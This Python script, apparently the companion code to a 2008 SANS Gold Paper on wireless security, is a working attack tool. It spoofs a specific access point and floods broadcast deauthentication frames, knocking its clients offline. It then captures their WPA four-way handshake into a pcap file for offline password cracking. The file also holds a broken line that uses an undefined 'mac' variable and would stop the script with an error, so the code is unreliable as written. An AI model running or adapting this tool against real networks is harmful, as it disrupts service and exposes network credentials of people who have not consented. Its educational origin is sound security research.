#!/usr/bin/env python

########################################
#
# This code is part of the SANS/GIAC Gold Paper titled
#
# Programming Wireless Security
#
# by Robin Wood (dninja@gmail.com), accepted May 2008
#
# For more information you can find the paper in the "Wireless Access" section of the
# SANS Reading Room at http://www.sans.org/reading_room/ or at www.digininja.org
#
########################################

import sys
from scapy import *
import pylorcon

interface = "ath0"
#interface = sys.argv[1]    
eapol_packets = []
handshake_found = 0

injector = pylorcon.Lorcon("ath0", "madwifing")
injector.setfunctionalmode("INJECT")
injector.setmode("MONITOR")
injector.setchannel(11)

destination_addr = '\xff\xff\xff\xff\xff\xff' # i.e. broadcast
bss_id_addr = '\x00\x0e\xa6\xce\xe2\x28'
source_addr = bss_id_addr # The AP is sending the deauth

packet = "\xc0\x00\x3a\x01"
packet = packet + destination_addr
packet = packet + source_addr
packet = packet + bss_id_addr
packet = packet + "\x80\xcb\x07\x00";

def deauth(packet_count):
	for n in range(packet_count):
		injector.txpacket (packet)


mac = ":".join([i.zfill(2) for i in mac.split(":")]).lower()

def sniffEAPOL(p):
	if p.haslayer(WPA_key):
		layer = p.getlayer (WPA_key)

		# First, check that the access point is the one we want to target
		AP = p.addr3
		if (not AP == bss_id_addr):
			print AP
			print "not ours\n"
			return

		if (p.FCfield & 1): 
			# Message come from STA 
			# From DS = 0, To DS = 1
			STA = p.addr2
		elif (p.FCfield & 2): 
			# Message come from AP
			# From DS = 1, To DS = 0
			STA = p.addr1
		else:
			# either ad-hoc or WDS
			return
	
		if (not tracking.has_key (STA)):
			fields = {
						'frame2': None,
						'frame3': None,
						'frame4': None,
						'replay_counter': None,
						'packets': []
					}
			tracking[STA] = fields

		key_info = layer.key_info
		wpa_key_length = layer.wpa_key_length
		replay_counter = layer.replay_counter

		WPA_KEY_INFO_INSTALL = 64
		WPA_KEY_INFO_ACK = 128
		WPA_KEY_INFO_MIC = 256

		# check for frame 2
		if ((key_info & WPA_KEY_INFO_MIC) and 
			(key_info & WPA_KEY_INFO_ACK == 0) and 
			(key_info & WPA_KEY_INFO_INSTALL == 0) and 
			(wpa_key_length > 0)) :
			print "Found packet 2 for ", STA
			tracking[STA]['frame2'] = 1
			tracking[STA]['packets'].append (p)

		# check for frame 3
		elif ((key_info & WPA_KEY_INFO_MIC) and 
			(key_info & WPA_KEY_INFO_ACK) and 
			(key_info & WPA_KEY_INFO_INSTALL)):
			print "Found packet 3 for ", STA
			tracking[STA]['frame3'] = 1
			# store the replay counter for this STA
			tracking[STA]['replay_counter'] = replay_counter
			tracking[STA]['packets'].append (p)

		# check for frame 4
		elif ((key_info & WPA_KEY_INFO_MIC) and 
			(key_info & WPA_KEY_INFO_ACK == 0) and 
			(key_info & WPA_KEY_INFO_INSTALL == 0) and
			tracking[STA]['replay_counter'] == replay_counter):
			print "Found packet 4 for ", STA
			tracking[STA]['frame4'] = 1
			tracking[STA]['packets'].append (p)

		
		if (tracking[STA]['frame2'] and tracking[STA]['frame3'] and tracking[STA]['frame4']):
			print "Handshake Found\n\n"
			wrpcap ("/var/gold/a.pcap", tracking[STA]['packets'])
			handshake_found = 1
			sys.exit(0)

tracking = {}

for i in range(1, 10):
	print "About to deauth\n\n"
	deauth(50)
	print "Deauth done, sniffing for EAPOL traffic"

	# reset the tracking between each sniffing attempt
	tracking = {}

	sniff(iface=interface,prn=sniffEAPOL, count=1000, timeout=30)
	
print "No handshake found\n\n"
